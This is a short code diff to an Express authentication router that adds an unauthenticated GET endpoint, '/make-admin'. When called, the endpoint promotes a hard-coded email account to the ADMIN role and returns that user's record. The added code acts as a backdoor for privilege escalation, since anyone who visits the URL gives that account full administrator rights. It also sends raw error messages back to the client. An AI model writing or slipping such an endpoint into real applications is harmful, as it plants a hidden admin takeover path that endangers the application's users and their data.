@@ -6,6 +6,19 @@ import bcrypt from 'bcryptjs';
 
 const router = express.Router();
 
+router.get('/make-admin', async (req, res) => {
+  try {
+    const user = await User.findOneAndUpdate(
+      { email: 'fast@gmail.com' },
+      { role: 'ADMIN' },
+      { new: true }
+    );
+    res.json({ message: 'Account upgraded to Admin!', user });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 
 
 router.post('/register', registerUser);
